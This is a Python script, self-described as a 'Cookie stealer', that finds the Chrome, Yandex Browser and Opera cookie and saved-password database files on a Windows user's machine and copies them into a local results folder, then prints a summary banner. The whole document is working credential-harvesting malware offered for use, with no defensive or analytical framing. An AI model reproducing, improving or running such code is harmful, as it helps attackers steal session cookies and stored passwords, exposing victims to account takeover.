import getpass
import os
import time
import shutil
print("-=Cookie stealer=-\n")
print("Welcome, " + getpass.getuser())
print("\nSearching cookie files...\n\n")

username = getpass.getuser()

try:
	os.mkdir("results")
except FileExistsError:
	pass

ChromeCookie = 'C:\\Users\\'+username+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'
ChromePass = "C:\\Users\\"+username+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
YandexCookie = "C:\\Users\\"+username+"\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies"
YandexPass = "C:\\Users\\"+username+"\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Password Checker"
OperaCookie = "C:\\Users\\"+username+"\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies"
OperaPass = "C:\\Users\\"+username+"\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"




if (os.path.exists(ChromeCookie)) == True:
	print("Google Chrome: Cookie - [+]")
	chromecookie = "Detected"
	shutil.copyfile(ChromeCookie, "results/ChromeCookie", follow_symlinks=True)

else:
	print("Google Chrome: Cookie - [-]")
	chromecookie = "Not detected"

	
if (os.path.exists(ChromePass)) == True:
	print("Google Chrome: Passwords - [+]")
	chromepasswords = "Detected"
	shutil.copyfile(ChromePass, "results/Google Chrome Passwords", follow_symlinks=True)
else:
	print("Google Chrome: Passwords - [-]")
	chromepasswords = "Not detected"


if (os.path.exists(YandexCookie)) == True:
	print("Yandex browser: Cookie - [+]")
	yandexcookie = "Detected"
	shutil.copyfile(YandexCookie, "results/Yandex Browser cookie", follow_symlinks=True)
else:
	print("Yandex browser: Cookie - [-]")
	yandexcookie = "Not detected"


if (os.path.exists(YandexPass)) == True:
	print("Yandex browser: Passwords - [+]")
	yandexpasswords = "Detected"
	shutil.copyfile(YandexPass, "results/Yandex Browser passwords", follow_symlinks=True)

else:
	print("Yandex browser: Passwords - [-]")
	yandexpasswords = "Not detected"
	

if (os.path.exists(OperaCookie)) == True:
	print("Opera: Cookie - [+]")
	operacookie = "Detected"
	shutil.copyfile(OperaCookie, "results/Opera cookie", follow_symlinks=True)

else:
	print("Opera: Cookie - [-]")
	operacookie = "Not detected"


if (os.path.exists(OperaPass)) == True:
	print("Opera: Passwords - [+]")
	operapasswords = "Detected"
	shutil.copyfile(OperaPass, "results/Opera passwords", follow_symlinks=True)

else:
	print("Opera: Passwords - [-]")
	operapasswords = "Not detected"


print("""
	*------------------------------------------------------------------*
	*    [<:::>] - Resultat of searching cookies:\n    *
	*    [<Chrome>]:
	*	 	[<] - Google Chrome cookies file: """ + chromecookie + """
	*	    	===>[<] - Google Chrome passwords file: """ + chromepasswords + """\n    *
	*    [<Yandex Browser>]:
	*	  	[<] - Yandex Browser cookies file: """ + yandexcookie + """
	*	  		===>[<] - Yandex Browser passwords file: """ + yandexpasswords + """\n    *
	*    [<Opera>]:
	*		[<] - Opera cookies file: """ + operacookie + """
	*			===>[<] - Opera passwords file: """ + operapasswords + """\n    *
	*
	*    [<:::>] - Results saved to launch stealer location\n    *
	*    [<:::>] - Good luck :3
	*
	*
	*
	*    [<:::>] - Coded by Fruthy
	*------------------------------------------------------------------*
	""")
input("[0]: Process finished! Press random button.")